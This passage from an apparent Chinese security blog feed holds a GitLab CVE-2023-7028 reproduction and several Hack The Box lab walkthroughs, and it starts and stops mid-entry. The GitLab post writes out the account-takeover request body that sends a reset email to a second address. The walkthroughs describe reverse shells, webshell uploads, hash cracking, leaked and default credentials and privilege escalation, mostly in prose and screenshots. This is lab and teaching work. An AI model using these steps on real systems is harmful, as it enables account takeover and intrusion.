class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">45597262</span>aaf<span class="hljs-number">095</span>ca<span class="hljs-number">2</span>be<span class="hljs-number">19116</span>b<span class="hljs-number">8</span>fd<span class="hljs-number">0</span>a</span><br></code></pre></td></tr></table></figure><p>并发5次之后，成功将normal账户添加到group中两次，并且无法删除该成员，只能删除组。</p><h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><p>如果使用旧版的Turbo Intruder插件，如果遇到HTTP&#x2F;2无法利用的情况，将HTTP&#x2F;2改为HTTP&#x2F;1.1即可。</p><p><a href="https://portswigger.net/research/smashing-the-state-machine">Smashing the state machine: the true potential of web race conditions | PortSwigger Research</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-7028_gitlab 任意用户密码重置漏洞复现</title>
    <link href="/2024/07/23/CVE-2023-7028_gitlab%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/07/23/CVE-2023-7028_gitlab%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-7028-gitlab-任意用户密码重置漏洞复现"><a href="#CVE-2023-7028-gitlab-任意用户密码重置漏洞复现" class="headerlink" title="CVE-2023-7028_gitlab 任意用户密码重置漏洞复现"></a>CVE-2023-7028_gitlab 任意用户密码重置漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>GitLab 是一个用于仓库管理系统的开源项目，其使用 Git 作为代码管理工具，可通过 Web 界面访问公开或私人项目。<br>GitLab CE&#x2F;EE 中支持用户通过辅助电子邮件地址重置密码。GitLab CE&#x2F;EE 多个受影响版本中，由于电子邮件验证过程中存在错误，用户帐户密码重置电子邮件可以发送到未经验证的电子邮件地址，可能导致在无需用户交互的情况下通过密码重置进行帐户接管。<br>CVSS3 评分为 10.0，严重。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>16.1 &lt;&#x3D; Gitlab &lt; 16.1.6<br>16.2 &lt;&#x3D; Gitlab &lt; 16.2.9<br>16.3 &lt;&#x3D; Gitlab &lt; 16.3.7<br>16.4 &lt;&#x3D; Gitlab &lt; 16.4.5<br>16.5 &lt;&#x3D; Gitlab &lt; 16.5.6<br>16.6 &lt;&#x3D; Gitlab &lt; 16.6.4<br>16.7 &lt;&#x3D; Gitlab &lt; 16.7.2</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先在 docker 中安装 gitlab-ee:16.7.0<br><code>docker pull gitlab/gitlab-ee:16.7.0-ee.0</code><br>启动容器：<br><code>docker run --detach --publish 8443:443 --publish 2222:22 --publish 9999:80 --name gitlab-container --restart always --volume $GITLAB_HOME/config:/etc/gitlab --volume $GITLAB_HOME/logs:/var/log/gitlab --volume $GITLAB_HOME/data:/var/opt/gitlab --shm-size 256m gitlab/gitlab-ee:16.7.0-ee.0</code><br>其中部分参数解释如下：</p><ul><li><code>detach </code>：在后台运行</li><li><code>--publish 8443:443 --publish 2222:22 --publish 9999:80</code>: 将容器内部的端口映射到宿主机上，分别将容器的443端口映射到宿主机的8443端口、容器的22端口映射到宿主机的2222端口、容器的80端口映射到宿主机的 9999端口</li><li><code>--restart always</code>: 如果容器停止，Docker 会自动重新启动容器</li><li><code>--shm-size 256m</code>: 设置容器中的共享内存大小为256兆字节<br>容器成功启动后，访问 9999 端口，以 root 登录，密码为随机值，进入容器后查看文件&#x2F;etc&#x2F;gitlab&#x2F;initial_root_password 即可。<br>下面配置&#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb 文件，配置完成后，才能通过忘记密码功能发送邮件。<br><img src="/2023/04/27/file-upload/8/image-20240115142222406.png"><br>搜索 smtp_enable，将对应选项打开，将 smtp 邮件服务器地址改为对应的值，此处我使用的是 163 邮箱，即改为 smtp.163.com，user_name 就是发送邮箱的账户，password 为授权码：<br><img src="/2023/04/27/file-upload/8/image-20240115142340278.png"><br>最后将 gitlab_rails[‘gitlab_email_from’]和 user[‘git_user_email’]也改为发件人地址即可。<br>配置文件修改完成后，更新一下配置：<br><code>gitlab-ctl stop</code><br><img src="/2023/04/27/file-upload/8/image-20240115142507638.png"><br><code>gitlab-ctl reconfigure</code><br><img src="/2023/04/27/file-upload/8/image-20240115142544587.png"><br><code>gitlab-ctl start</code><br><img src="/2023/04/27/file-upload/8/image-20240115142619795.png"><br>通过 gitlab-rails 测试是否配置成功：<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">gitlab-rails <span class="hljs-built_in">console</span><br>Notify.test_email(<span class="hljs-string">&#x27;ry4nnnn@163.com&#x27;</span>, <span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>).deliver_now<br></code></pre></td></tr></table></figure><img src="/2023/04/27/file-upload/8/image-20240115142705160.png"><br>测试邮件发送失败，提示 sendmail not found。<br>安装 sendmail 即可。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> install sendmail<span class="hljs-built_in"></span><br><span class="hljs-built_in">service </span>sendmail start<br></code></pre></td></tr></table></figure><p>下面再次测试：<br><img src="/2023/04/27/file-upload/8/image-20240115143002012.png"><br>等待两分钟左右，成功接收到邮件，至此已经完成所有配置。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>新建一个用户，邮箱设置为 <a href="mailto:&#49;&#x33;&#120;&#x78;&#120;&#120;&#x78;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">&#49;&#x33;&#120;&#x78;&#120;&#120;&#x78;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;</a> ,作为受害者账户。</p><h3 id="脚本一键利用"><a href="#脚本一键利用" class="headerlink" title="脚本一键利用"></a>脚本一键利用</h3><p><a href="https://github.com/Vozec/CVE-2023-7028">Fetching Data#zet5</a><br><img src="/2023/04/27/file-upload/8/image-20240115143345623.png"><br>-e 后输入自己的邮箱，运行后会收到一封重置邮件，将链接复制到 cmd 中即可一键完成密码修改，默认密码为一串随机值。<br>成功登录：<br><img src="/2023/04/27/file-upload/8/image-20240115143454315.png"></p><h3 id="burp-改包"><a href="#burp-改包" class="headerlink" title="burp 改包"></a>burp 改包</h3><p>点击忘记密码，输入受害者邮箱，抓包：<br><img src="/2023/04/27/file-upload/8/image-20240115144641095.png"><br>将 body 部分改为 user[email][]&#x3D;a.com&amp;user[email][]&#x3D;b.com 即可。密码重置邮件会同时发送给 a，b 两个邮箱，从而导致密码重置。<br><img src="/2023/04/27/file-upload/8/image-20240115150419752.png"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>官方已发布安全更新，建议升级至最新版本，若无法升级，建议开启双因素认证功能。</p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>CVE-2023-7028</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_armageddon</title>
    <link href="/2023/05/06/htb-armageddon/"/>
    <url>/2023/05/06/htb-armageddon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-armageddon"><a href="#htb-armageddon" class="headerlink" title="htb_armageddon"></a>htb_armageddon</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫端口：</p><p><img src="/2023/04/27/file-upload/mage-20230506152711881.png" alt="image-20230506152711881"></p><p>这里直接扫出来80端口为drupal 7。</p><p>后台目录扫一下：</p><p><img src="/2023/04/27/file-upload/mage-20230506152900917.png" alt="image-20230506152900917"></p><p>一一访问之后没有发现有用信息，但是在changelog.txt发现了具体版本号：</p><p><img src="/2023/04/27/file-upload/mage-20230506152942915.png" alt="image-20230506152942915"></p><p>当前drupal版本为7.56.</p><p>火狐访问：</p><p><img src="/2023/04/27/file-upload/mage-20230506153014238.png" alt="image-20230506153014238"></p><p>这里为登录框，考虑sql注入或者默认密码弱口令等等，但是由于已经框架和版本，先搜索有无对应漏洞。</p><p>searchsploit：</p><p><img src="/2023/04/27/file-upload/mage-20230506153100443.png" alt="image-20230506153100443"></p><p>前四个都跟版本号对应，但是除了drupaldeggon2 rce，都需要认证，pass。</p><p>考虑利用该RCE漏洞：</p><p><img src="/2023/04/27/file-upload/mage-20230506153250036.png" alt="image-20230506153250036"></p><p>CVE-2018-7600。去github查找相应poc，直接利用：</p><p><img src="/2023/04/27/file-upload/mage-20230506153349570.png" alt="image-20230506153349570"></p><p>获得apache的shell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>搜索得到drupal默认配置文件的路径：</p><p><img src="/2023/04/27/file-upload/mage-20230506153707967.png" alt="image-20230506153707967"></p><p><img src="/2023/04/27/file-upload/mage-20230506154003209.png" alt="image-20230506154003209"></p><p>得到数据库的账号密码。</p><p>mysql登录，注意需要使用-e参数执行命令，由于不是完全交互式shell，直接登录会卡死：</p><p><img src="/2023/04/27/file-upload/mage-20230506154106713.png" alt="image-20230506154106713"></p><p>筛选出pass，加密的密文，接下来考虑解密。</p><p>使用john，失败：</p><p><img src="/2023/04/27/file-upload/mage-20230506154158571.png" alt="image-20230506154158571"></p><p>使用hashcat爆破，首先选择mode：</p><p><img src="/2023/04/27/file-upload/mage-20230506154301967.png" alt="image-20230506154301967"></p><p>爆破：<br><code>hashcat -m 7900 pass /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/27/file-upload/mage-20230506154328257.png" alt="image-20230506154328257"></p><p>得到密码booboo，22端口开放，直接ssh登录：</p><p><img src="/2023/04/27/file-upload/mage-20230506154359188.png" alt="image-20230506154359188"></p><p>sudo -l，发现可以sudo直接snap命令。去gtfobins搜索该命令：</p><p><img src="/2023/04/27/file-upload/mage-20230506154436272.png" alt="image-20230506154436272"></p><p>先在本地kali生成一个.snap文件，再上传到靶机上执行。</p><p>如果kali没有fpm，先安装<code>gem install fpm</code>，接着生成.snap文件，command就是要执行的命令：</p><p><img src="/2023/04/27/file-upload/mage-20230506154512221.png" alt="image-20230506154512221"></p><p>在靶机上下载该文件，wget失败，因此使用curl保存，再执行提权命令：</p><p><img src="/2023/04/27/file-upload/mage-20230506154621073.png" alt="image-20230506154621073"></p><p>uid&#x3D;0，root权限。</p><p>修改command为cat &#x2F;root&#x2F;root.txt:</p><p><img src="/2023/04/27/file-upload/mage-20230506154648840.png" alt="image-20230506154648840"></p><p>执行：</p><p><img src="/2023/04/27/file-upload/mage-20230506154713102.png" alt="image-20230506154713102"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_mirai</title>
    <link href="/2023/05/06/htb-mirai/"/>
    <url>/2023/05/06/htb-mirai/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-mirai"><a href="#htb-mirai" class="headerlink" title="htb_mirai"></a>htb_mirai</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230505211229060.png" alt="image-20230505211229060"></p><p>重点关注80端口和32400的http服务。</p><p>80端口：</p><p><img src="/2023/04/27/file-upload/age-20230506100232470.png" alt="image-20230506100232470"></p><p>空白，查看源代码也没有任何内容。</p><p>目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230506100934237.png" alt="image-20230506100934237"></p><p>存在admin目录：</p><p><img src="/2023/04/27/file-upload/age-20230506100959978.png" alt="image-20230506100959978"></p><p>在底部可以看到版本信息：</p><p><img src="/2023/04/27/file-upload/age-20230506101533458.png" alt="image-20230506101533458"></p><p>3.1.4，exploitdb搜索一下：</p><p><img src="/2023/04/27/file-upload/age-20230506101602622.png" alt="image-20230506101602622"></p><p>存在rce，但是版本号不对，并且需要认证，pass。</p><p>点击图标：</p><p><img src="/2023/04/27/file-upload/age-20230506101903505.png" alt="image-20230506101903505"></p><p>发现是树莓派，google得到默认账号密码：pi&#x2F;raspberry，尝试登录，失败。</p><p>ssh登录成功：</p><p><img src="/2023/04/27/file-upload/age-20230506102203946.png" alt="image-20230506102203946"></p><p>对于另一个开放的http端口，访问后为一个登录框：</p><p><img src="/2023/04/27/file-upload/age-20230506102444787.png" alt="image-20230506102444787"></p><p>无法注册，登录后各个参数尝试注入，无果，并且会锁登录次数，pass。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>ssh成功后，find查找flag：</p><p><img src="/2023/04/27/file-upload/age-20230506102538831.png" alt="image-20230506102538831"></p><p>sudo -l提权：</p><p><img src="/2023/04/27/file-upload/age-20230506102728212.png" alt="image-20230506102728212"></p><p>查看root.txt，提示：</p><p><img src="/2023/04/27/file-upload/age-20230506102927697.png" alt="image-20230506102927697"></p><p>root在usb里，mount命令结合df命令查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103005719.png" alt="image-20230506103005719"></p><p>进入&#x2F;media&#x2F;usbstick查看：</p><p><img src="/2023/04/27/file-upload/age-20230506103138523.png" alt="image-20230506103138523"></p><p>提示root被删了….，翻&#x2F;dev&#x2F;sdb文件：</p><p><img src="/2023/04/27/file-upload/age-20230506103217232.png" alt="image-20230506103217232"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_squashed</title>
    <link href="/2023/05/05/htb-squashed/"/>
    <url>/2023/05/05/htb-squashed/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-squashed"><a href="#htb-squashed" class="headerlink" title="htb_squashed"></a>htb_squashed</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/2023/04/27/file-upload/image-20230505170109970.png" alt="image-20230505170109970"></p><p>详细扫描：</p><p><img src="/2023/04/27/file-upload/image-20230505170223256.png" alt="image-20230505170223256"></p><p>重点放在http和rpc服务上。</p><p>先看80端口的http：</p><p><img src="/2023/04/27/file-upload/image-20230505170501511.png" alt="image-20230505170501511"></p><p>目录爆破：<br><img src="/2023/04/27/file-upload/image-20230505170521065.png" alt="image-20230505170521065"></p><p>没有可用信息。</p><p>rpcinfo：</p><p><img src="/2023/04/27/file-upload/image-20230505170841327.png" alt="image-20230505170841327"></p><p>showmount看一下有无可挂载目录：</p><p><img src="/2023/04/27/file-upload/image-20230505170910819.png" alt="image-20230505170910819"></p><p>有两个，&#x2F;home&#x2F;ross和&#x2F;var&#x2F;www&#x2F;html。</p><p>分别挂载到&#x2F;mnt&#x2F;1,&#x2F;mnt&#x2F;2:</p><p><img src="/2023/04/27/file-upload/image-20230505172757455.png" alt="image-20230505172757455"></p><p>并且根据所有者的uid，创建用户test1,test2，uid分别为1001和2017.</p><p>切换到test1，进入&#x2F;home&#x2F;ross挂载目录：</p><p><img src="/2023/04/27/file-upload/image-20230505172957737.png" alt="image-20230505172957737"></p><p>发现.Xauthority文件，查看内容发现magic-cookie等字符串：</p><p><img src="/2023/04/27/file-upload/image-20230505173026499.png" alt="image-20230505173026499"></p><p>接着切换到test2，进入&#x2F;var&#x2F;www&#x2F;html:</p><p><img src="/2023/04/27/file-upload/image-20230505173119147.png" alt="image-20230505173119147"></p><p>看起来是网站目录，尝试写入文件：</p><p><img src="/2023/04/27/file-upload/image-20230505173153436.png" alt="image-20230505173153436"></p><p>写入成功，通过curl判断后台语言类型：</p><p><img src="/2023/04/27/file-upload/image-20230505173221379.png" alt="image-20230505173221379"></p><p>暂未发现，尝试php：</p><p><img src="/2023/04/27/file-upload/image-20230505173325297.png" alt="image-20230505173325297"></p><p>成功解析，下一步直接写马弹shell。</p><p>在本机上查找php反弹shell脚本，修改lhost后本地开启python http server，再用test2用户下载到网站目录下：</p><p><img src="/2023/04/27/file-upload/image-20230505173539068.png" alt="image-20230505173539068"></p><p>访问php马，成功接收到shell：</p><p><img src="/2023/04/27/file-upload/image-20230505173728022.png" alt="image-20230505173728022"></p><p>在home目录下发现user.txt：</p><p><img src="/2023/04/27/file-upload/image-20230505173824712.png" alt="image-20230505173824712"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>接下来进行权限提升。（全靠wp）</p><p>将&#x2F;home&#x2F;ross目录下的.Xauthority保存到&#x2F;tmp目录下：</p><p><img src="/2023/04/27/file-upload/image-20230505174239342.png" alt="image-20230505174239342"></p><p>保存之后设置环境变量XAUTHORITY，并且通过w命令查看当前所处的display：</p><p><img src="/2023/04/27/file-upload/image-20230505174421274.png" alt="image-20230505174421274"></p><p>起python服务器，下载至本地，再利用convert工具转换为png：</p><p><img src="/2023/04/27/file-upload/image-20230505174724974.png" alt="image-20230505174724974"></p><p>发现root密码，su提到root：</p><p><img src="/2023/04/27/file-upload/image-20230505174833420.png" alt="image-20230505174833420"></p><p>成功。</p><p>涉及到的X11工具为一个display manager，具体相关原理自行google。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blocky</title>
    <link href="/2023/05/05/htb-blocky/"/>
    <url>/2023/05/05/htb-blocky/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blocky"><a href="#htb-blocky" class="headerlink" title="htb_blocky"></a>htb_blocky</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap：</p><p><img src="/2023/04/27/file-upload/-20230505100458297.png" alt="image-20230505100458297"></p><p><img src="/2023/04/27/file-upload/-20230505100513185.png" alt="image-20230505100513185"></p><p>访问http（记得添加dns解析）：</p><p><img src="/2023/04/27/file-upload/-20230505100551956.png" alt="image-20230505100551956"></p><p>目录爆破：</p><p><img src="/2023/04/27/file-upload/-20230505100715971.png" alt="image-20230505100715971"></p><p>这里有几个目录需要关注，首先是wp-login.php，表明这是wordpress，其次还存在phpmyadmin，可以考虑写shell，还有&#x2F;plugins。</p><p>phpmyadmin:</p><p><img src="/2023/04/27/file-upload/-20230505100857737.png" alt="image-20230505100857737"></p><p>弱口令失败，常规的登录界面：</p><p><img src="/2023/04/27/file-upload/-20230505101115855.png" alt="image-20230505101115855"></p><p>&#x2F;plugins：</p><p><img src="/2023/04/27/file-upload/-20230505101142490.png" alt="image-20230505101142490"></p><p>存在两个jar包，下载至本地，利用jd-gui查看：</p><p><img src="/2023/04/27/file-upload/-20230505101337316.png" alt="image-20230505101337316"></p><p>在blockycore.class中发现一组账号密码:root&#x2F;8YsqfCTnvxAUeduzjNSXe22</p><p>由于网站为wordpress，用wpscan扫一下：</p><p><code>wpscan --url http://blocky.htb -e u,ap</code></p><p><img src="/2023/04/27/file-upload/-20230505101556152.png" alt="image-20230505101556152"></p><p>发现用户notch。</p><p>接下来尝试利用账号密码登录wordpress，失败。</p><p>用该账户登录phpmyadmin：</p><p><img src="/2023/04/27/file-upload/-20230505101918535.png" alt="image-20230505101918535"></p><p>成功登录，并且查到notch用户。</p><p>不知道绝对路径和网站目录路径，因此跳过phpmyadmin写shell，再利用该账户ssh：</p><p><img src="/2023/04/27/file-upload/-20230505102933041.png" alt="image-20230505102933041"></p><p>root登录失败，notch登录成功。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/-20230505103014481.png" alt="image-20230505103014481"></p><p>可以执行所有命令，直接&#x2F;bin&#x2F;bash:</p><p><img src="/2023/04/27/file-upload/-20230505103044495.png" alt="image-20230505103044495"></p><p>root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_granny</title>
    <link href="/2023/05/04/htb-granny/"/>
    <url>/2023/05/04/htb-granny/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-granny"><a href="#htb-granny" class="headerlink" title="htb_granny"></a>htb_granny</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫一下端口：</p><p><img src="/2023/04/27/file-upload/mage-20230504104404836-168316916606612.png" alt="image-20230504104404836"></p><p>发现为IIS 6.0，windows系统：</p><p><img src="/2023/04/27/file-upload/mage-20230504104434854-168316916606713.png" alt="image-20230504104434854"></p><p>并且存在http-webdav。</p><p>上面可以看到支持PUT,MOVE等http方法，很自然想到put一个shell.txt，再通过MOVE来执行。</p><p>curl查看信息：</p><p><img src="/2023/04/27/file-upload/mage-20230504104556287-168316916606714.png" alt="image-20230504104556287"></p><p>asp.net。</p><p>此处可以通过burp，发生PUT请求，上传一个txt文件，再move，也可以直接用工具davtest：</p><p><img src="/2023/04/27/file-upload/mage-20230504104710372-168316916606715.png" alt="image-20230504104710372"></p><p>测试发现可以上传文件。</p><p>msfvenom生成asp马，davtest上传：</p><p><img src="/2023/04/27/file-upload/mage-20230504104759856-168316916606716.png" alt="image-20230504104759856"></p><p><img src="/2023/04/27/file-upload/mage-20230504104809685-168316916606717.png" alt="image-20230504104809685"></p><p>接下来move该文件，davtest工具自带了move参数，但是未能成功利用，改用curl：</p><p><img src="/2023/04/27/file-upload/mage-20230504104913150-168316916606718.png" alt="image-20230504104913150"></p><p>msf开启监听，成功回连：</p><p><img src="/2023/04/27/file-upload/mage-20230504104950240-168316916606719.png" alt="image-20230504104950240"></p><p>这里执行getuid或者sysinfo都提示access denied，直接进程迁移即可：</p><p><img src="/2023/04/27/file-upload/mage-20230504105627463-168316916606720.png" alt="image-20230504105627463"></p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>x86系统，接下来用msf自动查找提权模块：</p><p><img src="/2023/04/27/file-upload/mage-20230504105705635-168316916606721.png" alt="image-20230504105705635"></p><p>选择第一个，exploit，拿到system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230504105745329-168316916606311.png" alt="image-20230504105745329"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_knife</title>
    <link href="/2023/05/03/htb-knife/"/>
    <url>/2023/05/03/htb-knife/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-knife"><a href="#htb-knife" class="headerlink" title="htb_knife"></a>htb_knife</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先nmap扫描：</p><p><img src="/2023/04/27/file-upload/age-20230503211205639.png" alt="image-20230503211205639"></p><p>22，80端口开放，进行扫描结果如上。</p><p>火狐访问：</p><p><img src="/2023/04/27/file-upload/age-20230503211315489.png" alt="image-20230503211315489"></p><p>看起来是个静态页面，尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/age-20230503211338356.png" alt="image-20230503211338356"></p><p>没有可用信息。</p><p>尝试curl</p><p><img src="/2023/04/27/file-upload/age-20230503212322026.png" alt="image-20230503212322026"></p><p>发现php&#x2F;8.1.0-dev，searchsploit搜索：<br><img src="/2023/04/27/file-upload/age-20230503212552202.png" alt="image-20230503212552202"></p><p>直接利用py脚本：</p><p><img src="/2023/04/27/file-upload/age-20230503212837304.png" alt="image-20230503212837304"></p><p>getshell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>使用上述脚本连接的shell不稳定，直接在ua里弹shell，nc监听：</p><p><img src="/2023/04/27/file-upload/age-20230503212939601.png" alt="image-20230503212939601"></p><p><img src="/2023/04/27/file-upload/age-20230503213001126.png" alt="image-20230503213001126"></p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/age-20230503213116184.png" alt="image-20230503213116184"></p><p>可以sudo执行knife文件。</p><p>使用file和strings命令查看knife：</p><p><img src="/2023/04/27/file-upload/age-20230503213202030.png" alt="image-20230503213202030"></p><p>大概看出为一个rb的可执行文件。</p><p>&#x2F;usr&#x2F;bin&#x2F;knife -h:</p><p><img src="/2023/04/27/file-upload/age-20230503213358978.png" alt="image-20230503213358978"></p><p>knife exec [script]</p><p>因此写一个rb文件，给bash加suid，再通过&#x2F;bin&#x2F;bash -p提权：</p><p><img src="/2023/04/27/file-upload/age-20230503213445945.png" alt="image-20230503213445945"></p><p>成功拿到root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_netmon</title>
    <link href="/2023/05/03/htb-netmon/"/>
    <url>/2023/05/03/htb-netmon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-netmon"><a href="#htb-netmon" class="headerlink" title="htb_netmon"></a>htb_netmon</h1><p>首先是nmap扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.152</code></p><p><img src="/2023/04/27/file-upload/mage-20230503200138890.png" alt="image-20230503200138890"></p><p>ftp服务开放，ftp尝试匿名登录：</p><p><img src="/2023/04/27/file-upload/mage-20230503200318244.png" alt="image-20230503200318244"></p><p>在public目录下发现user.txt.</p><p>接下来考虑http服务。</p><p>仔细扫一下80口：</p><p><img src="/2023/04/27/file-upload/mage-20230503200414831.png" alt="image-20230503200414831"></p><p>发现为PRTG 18.1，火狐访问：<br><img src="/2023/04/27/file-upload/mage-20230503200507925.png" alt="image-20230503200507925"></p><p>需要账号密码进行登录，尝试prtg默认密码prtgadmin&#x2F;prtgadmin失败，再次回到ftp寻找：</p><p><img src="/2023/04/27/file-upload/mage-20230503200600225.png" alt="image-20230503200600225"></p><p>最终在&#x2F;users&#x2F;all user&#x2F;paessler&#x2F;prtg network monitor目录下找到配置文件（看wp得知）。</p><p>接下来搜索密码相关字符：</p><p><img src="/2023/04/27/file-upload/mage-20230503200714445.png" alt="image-20230503200714445"></p><p>找到prtgadmin&#x2F;PrTg@dmin2018</p><p>利用这组账号登录，失败，正确密码为PrTg@dmin2019(参考wp得知)。</p><p>searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/mage-20230503200847852.png" alt="image-20230503200847852"></p><p>存在RCE，查看sh文件：</p><p><img src="/2023/04/27/file-upload/mage-20230503200916968.png" alt="image-20230503200916968"></p><p>CVE-2018-9276.</p><p>github下载相关利用poc：</p><p><img src="/2023/04/27/file-upload/mage-20230503200959209.png" alt="image-20230503200959209"></p><p>直接为system权限：</p><p><img src="/2023/04/27/file-upload/mage-20230503201012353.png" alt="image-20230503201012353"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_cap</title>
    <link href="/2023/05/02/htb-cap/"/>
    <url>/2023/05/02/htb-cap/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-cap"><a href="#htb-cap" class="headerlink" title="htb_cap"></a>htb_cap</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>端口扫描：</p><p><code>nmap -p- --min-rate=1000 -T4 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502220157451.png" alt="image-20230502220157451"></p><p><code>nmap -sC -sV -A -p 21,22,80 10.10.10.245</code></p><p><img src="/2023/04/27/file-upload/e-20230502221443622.png" alt="image-20230502221443622"></p><p>开放了21，22，80端口，首先尝试从80http服务突破，访问：</p><p><img src="/2023/04/27/file-upload/e-20230502223709813.png" alt="image-20230502223709813"></p><p>点击security snapshots：</p><p><img src="/2023/04/27/file-upload/e-20230502224340252.png" alt="image-20230502224340252"></p><p>发现url变为&#x2F;data&#x2F;1.</p><p>此时将url改为&#x2F;data&#x2F;0,页面改变，出现流量，点击下载，查看下载的pcap：</p><p><img src="/2023/04/27/file-upload/e-20230502224432032.png" alt="image-20230502224432032"></p><p>发现tfp流量，查看内容：</p><p><img src="/2023/04/27/file-upload/e-20230502224603202.png" alt="image-20230502224603202"></p><p>找到ftp账号密码。</p><p>接下来使用ftp登录：</p><p><img src="/2023/04/27/file-upload/e-20230502224824145.png" alt="image-20230502224824145"></p><p>找到user.txt。</p><p>再用这组账号尝试直接登录ssh：</p><p><img src="/2023/04/27/file-upload/e-20230502224913833.png" alt="image-20230502224913833"></p><p>成功，接下来提权到root。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege 